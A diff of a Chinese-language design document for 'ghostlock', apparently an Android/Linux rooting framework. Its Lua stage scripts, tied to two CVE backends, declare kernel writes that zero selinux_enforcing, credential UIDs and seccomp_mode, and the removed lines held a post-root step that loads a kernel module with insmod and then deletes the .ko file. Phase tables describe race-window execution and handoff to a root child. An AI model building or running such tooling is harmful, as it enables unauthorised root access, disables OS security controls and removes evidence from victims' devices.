@@ -20,8 +20,9 @@ ghostlock {
         -- (1) 这一段在 root 之前跑一次（stage）：只声明，不执行
         local b = backend("cve_2026_43499")          -- 句柄（窗口外取得）
 
-        b:writeop{ target = "selinux_enforcing", value = 0, width = 4 }   -- W1
-        b:writeop{ target = "cred_uid",         value = 0, width = 4 }   -- W2（示例符号）
+        b:writeop{ target = "selinux_enforcing", value = 0, width = 4 }   -- W1（参数集已考古定稿）
+        -- 结构复制（考古新增的第二形态）：宽度 = profile 声明的结构尺寸
+        b:copyop{  src = "cred_template",      dst = "cred_target", width = cfg.sizes.cred }  -- W2
         b:writeop{ target = "seccomp_mode",     value = 0, width = 8 }   -- W3
 
         -- 自由循环/条件（值来自数据面，不写死）
@@ -35,23 +36,7 @@ ghostlock {
         end
 
         b:handoff{ terminal = "root_child" }        -- 交接给 terminal 相位
-
-        -- (2) 收尾：声明式；root 之后由 C++ terminal 层执行（Lua 此时已不在运行）
-        terminal{
-          on_success = {
-            run{ argv = { "insmod", cfg.lkm.path, "ghostlock_mode=" .. cfg.lkm.mode },
-                 capture = true, timeout_ms = 20000 },
-            run{ argv = { "setprop", "ghostlock.state", "done" } },
-          },
-          always = {
-            run{ argv = { "rm", "-f", cfg.tmp.ko_path } },          -- 无论成败都清场
-          },
-          on_failure = {
-            run{ argv = { "sh", "-c",                          -- 要 shell 就显式写 sh -c
-                          "log -t ghostlock handoff-failed; dmesg | tail -n 40 > " .. cfg.paths.diag },
-                 timeout_ms = 5000 },
-          },
-        }
+        -- 收尾脚本与 LKM 由 Kotlin 在 resolve 后准备并作为输入传入；磁盘 HOCON 不定义具体 handoff
       ]==]
     },
     {
@@ -60,7 +45,7 @@ ghostlock {
         local p = backend("cve_2026_43284")
         p:writeop{ target = "pagecache_slot", value = 1, width = 8 }
         p:handoff{ terminal = "umh_forward" }
-        terminal{ on_success = { run{ argv = { "id" }, capture = true, timeout_ms = 3000 } } }
+        -- 收尾同上：由 Kotlin 在 resolve 后作为输入传入；本档不定义命令内容
       ]==]
     },
   ]
@@ -89,7 +74,7 @@ ghostlock {
 | 2 | **stage**（root 前、窗口外） | **Lua 沙箱** | 脚本跑**一次**：backend(...) 取句柄 → writeop/settle/handoff 被**冻结成 staged 计划**；for/if 与 cfg.* 在此刻求值 | 逐调用边界校验（未知名字 ⇒ surface-unknown-name；argv 与 shell 违规 ⇒ run-form-invalid；参数越界 ⇒ param-invalid） |
 | 3 | gate | C++ | 对 **staged 计划**（不是脚本）做十条校验 | 顺序/依赖/可用性/几何/窗口禁项 |
 | 4 | **窗口**（PI 竞争） | C++ | writeop（属窗口相位）**原子执行**；**窗口内零 Lua** | 窗口禁项扫描 · 逐退出路径回收 |
-| 5 | handoff | C++ | 交接给 terminal（root_child） | 三层收尾的第 1 层由 staged 提供 |
+| 5 | handoff | C++ | 交接给 terminal（root_child） | **收尾内容由 Kotlin 在 resolve 后作为输入传入**（HOCON 不定义具体命令） |
 | 6 | **terminal 相位**（root 后） | **C++ terminal 层** | 按 on_success / always / on_failure 执行 staged 的 run 条目：argv → execv；sh -c 就是一条普通 argv | 每条记 argv/命令串/exit/耗时 进日志 |
 | 7 | 内核兜底 | **C++** | 恢复 relay/enforce、watchdog | 不经 Lua |
 
@@ -106,12 +91,12 @@ ghostlock {
 | backend("cve_2026_43499") | 脚本首行 | 窗口外（取句柄） |
 | b:writeop{ target, value, width } | W1/W2/W3 与 43284 的写入 | **窗口相位** |
 | b:settle{ us } | W3 重试循环内 | **窗口相位** |
-| b:handoff{ terminal } | 交接 | 窗口外 |
+| b:handoff{ terminal, payload_ref } | 交接（**引用语义**：只声明 terminal + payload 引用） | 窗口外 |
 | cfg.backend... / cfg.lkm.path | 各处取数 | stage 期只读快照 |
-| run{ argv = {...} } | 收尾三块 | **terminal 相位（root 后）** |
+| ~~run{ argv = {...} }~~（**待裁定移除**） | 收尾（若保留） | **terminal 相位（root 后）** |
 | gl.sym("seccomp_mode") | 条件判断 | stage 期（预置工具函数） |
 
 ## §5 待确认两处（影响本示例的最终写法）
 
-1. **run 的 shell 形态**：本示例**只用 argv**（要 shell 就写 sh -c）。若选 **O2（去掉 shell 字段）**，示例即最终形态；若选 **O1**，可把 sh -c 简写成 run{ shell = "..." }。
-2. **gl.* 预置函数**：示例用了 gl.sym(...)。首批 12 个（u64/hex/bits.*/align_*/parse_num/split/trim/retry/check/abort/sym）——确认后写进设计。
+1. **`run` 是否整体移除**（**Lead 倾向移除**）：若移除，收尾部分改由 Kotlin 在 resolve 后生成并随 payload 传入，脚本内不再出现 `run`。
+2. **handoff payload 的承载**：**wire `bin` + sha256** 还是会话帧？（影响 payload 如何送进 native 与校验点。）
